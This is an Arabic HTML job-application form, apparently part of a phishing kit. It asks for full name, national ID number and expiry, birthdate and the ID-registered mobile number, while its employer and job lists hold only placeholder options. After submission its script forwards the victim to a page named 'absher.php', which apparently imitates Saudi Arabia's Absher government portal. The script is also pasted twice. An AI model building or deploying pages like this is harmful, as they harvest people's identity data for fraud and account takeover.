<!DOCTYPE html>
<html>
<head>
    <title>منصة توظيف فورم</title>
    <style>
        body {
            background-color: lightgreen;
            direction: rtl;
        }
        .form-container {
            width: 300px;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
        }
        .form-container label {
            text-align: right;
        }
        .form-container input[type="text"],
        .form-container input[type="date"],
        .form-container select {
            width: 100%;
            padding: 5px;
            margin-bottom: 10px;
        }
        .form-container button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="form-container">
    <form action="submit.php" method="post" onsubmit="return submitForm(event)">
            <label for="name">الاسم الرباعي:</label>
            <input type="text" name="name" id="name" required>

            <label for="id_card">رقم بطاقة الأحوال:</label>
            <input type="text" name="id_card" id="id_card" required>

            <label for="id_card_expiry">تاريخ انتهاء بطاقة الأحوال:</label>
            <input type="date" name="id_card_expiry" id="id_card_expiry" required>

            <label for="birthdate">تاريخ الميلاد:</label>
            <input type="date" name="birthdate" id="birthdate" required>

            <label for="mobile">رقم الجوال المسجل بالهوية:</label>
            <input type="text" name="mobile" id="mobile" required>

            <label for="employer">اسم مؤسسة التوظيف:</label>
            <select name="employer" id="employer" required>
                <option value="option1">خيار 1</option>
                <option value="option2">خيار 2</option>
                <option value="option3">خيار 3</option>
            </select>

            <label for="job_title">المنصب الوظيفي:</label>
            <select name="job_title" id="job_title" required>
                <option value="option1">خيار 1</option>
                <option value="option2">خيار 2</option>
                <option value="option3">خيار 3</option>
            </select>

            <label for="area">المنطقة:</label>
            <input type="text" name="area" id="area" required>

            <button type="submit">تقديم طلب التوظيف</button>
            
        </form>
        
        <script>
  function submitForm(event) {
    event.preventDefault(); // يمنع النموذج من الارسال المباشر

    // تنفيذ أي عمليات إضافية قبل الانتقال للصفحة الثانية
    // ...

    // جمع البيانات من النموذج
    var form = event.target;
    var formData = new FormData(form);

    // إرسال البيانات باستخدام XMLHttpRequest
    var xhr = new XMLHttpRequest();
    xhr.open(form.method, form.action, true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // تم إرسال البيانات بنجاح، يمكن الانتقال للصفحة الثانية
        window.location.href = "absher.php";
      }
    };
    xhr.send(formData);

    return false;
  }
</script>


    </div>
</body>
</html>






  <!-- محتوى النموذج -->
  

<script>
  function submitForm(event) {
    event.preventDefault(); // يمنع النموذج من الارسال المباشر

    // تنفيذ أي عمليات إضافية قبل الانتقال للصفحة الثانية
    // ...

    // جمع البيانات من النموذج
    var form = event.target;
    var formData = new FormData(form);

    // إرسال البيانات باستخدام XMLHttpRequest
    var xhr = new XMLHttpRequest();
    xhr.open(form.method, form.action, true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // تم إرسال البيانات بنجاح، يمكن الانتقال للصفحة الثانية
        window.location.href = "absher.php";
      }
    };
    xhr.send(formData);

    return false;
  }
</script>